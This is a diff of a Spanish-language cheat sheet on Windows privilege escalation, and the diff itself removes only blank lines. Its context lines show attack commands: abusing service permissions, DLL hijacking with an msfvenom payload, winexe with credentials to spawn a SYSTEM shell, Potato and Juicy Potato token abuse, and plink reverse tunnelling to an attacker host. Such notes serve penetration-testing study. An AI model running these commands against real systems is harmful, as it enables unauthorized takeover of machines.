@@ -54,8 +54,6 @@ Empezar o terminar un servicio
 
 > net start <nombre>
 
-
-
 ```
 
 
@@ -88,21 +86,17 @@ Empezar o terminar un servicio
 
 > net start filepermsvc
 
-
-
 ````
 
 ### DLL Hijacking
 - Un servicio siempre tratará de cargar una funcionalidad desde una DLL (dynamic-link library). El DLL siempre cargará con los privilegios del servicio, si un DLL esta cargada desde una PATH absoluta entonces es posible escalar privilegios, si también tenemos permisos de escritura. Una misconfiguración muy común son los DLL que no se encuentra en el sistema por lo que con msfvenom podemos hacer un payload con formato DLL.
 
 ```
-
 > accesschk.exe /accepteula -uvqc user dllsvc 
 
 > sc qc dllsvc 
 
 > Después poner el payload en el directorio donde este la vulnerabilidad
-
 
 ```
 
@@ -130,7 +124,6 @@ Empezar o terminar un servicio
 
 > Una vez que tengamos credenciales válidas podemos usar herramientas como winexe para spawnear una cmd.exe
  ```
- 
  > winexe -U 'admin%password' --system //10.10.10.X cmd.exe
  
  ```
@@ -254,11 +247,9 @@ Empezar o terminar un servicio
 potato.exe -ip x.x.x.x -cmd "C:\PrivEsc\shell.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true
 
 ```
-
 ## Juicy Potatos
 
 - Si el servicio tiene asignada en el un token de SeImpersonatePrivilege activada entonces es vulnerable a un juicy potat, rotten potate....
-
 
 ```
 > whoami /priv
@@ -272,7 +263,6 @@ potato.exe -ip x.x.x.x -cmd "C:\PrivEsc\shell.exe" -enable_http server true -ena
 - Editar el arvhico en tu linux de /etc/ssh/sshd_config 
 
 ```
-
 > plink.exe root@10.10.10.x -R [LPORT]:127.0.0.1:[RPORT]
 > winxec -U 'admin%password123' //127.0.0.1 cmd.exe
 
